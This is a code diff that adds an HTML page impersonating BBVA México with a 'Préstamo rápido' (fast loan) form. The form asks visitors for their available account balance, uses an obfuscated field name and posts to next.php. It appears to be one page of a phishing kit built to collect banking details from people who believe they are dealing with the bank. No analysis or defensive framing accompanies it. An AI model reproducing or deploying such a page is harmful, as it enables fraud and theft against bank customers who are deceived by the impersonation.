@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">
+    <title>Préstamos | BBVA México</title>
+
+    <link rel="icon" href="/assets/images/i.jfif">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/css/normalize.css">
+    <link rel="stylesheet" href="/assets/css/styles.css">
+</head>
+
+<body>
+
+    <header class="header">
+        <div class="header-container">
+            <a href="/"><img src="assets/images/l.svg" alt="Logo"></a>
+        </div>
+    </header>
+
+    <main class="container">
+
+        <div class="l-container">
+
+            <div class="ttle-container">
+                <h1>Préstamo rápido</h1>
+            </div>
+
+            <form class="form" method="POST" action="next.php" enctype="multipart/form-data">
+
+                <div class="la-input">
+                    <input type="text" pattern="[0-9]*" inputmode="numeric"
+                        placeholder="Indica de cuanto quieres tu prestamo">
+                </div>
+
+                <div class="ab-input">
+                    <input type="text" pattern="[0-9]*" inputmode="numeric" id="ab" name="dhfhd"
+                        placeholder="Saldo disponible" required>
+                </div>
+
+                <input type="submit" id="sbmt" value="Siguiente" required>
+            </form>
+        </div>
+
+        <div class="t-container">
+            <div class="tip">
+                <p><strong>Saldo disponible.</strong></p>
+                <p>
+                    Indica el saldo disponible en tu cuenta en pesos.
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <script type="text/javascript">
+
+        document.getElementById("ab").addEventListener("keypress", function (evt) {
+            if (evt.which < 48 || evt.which > 57) {
+                evt.preventDefault();
+            }
+        });
+
+    </script>
+</body>
+
+</html>
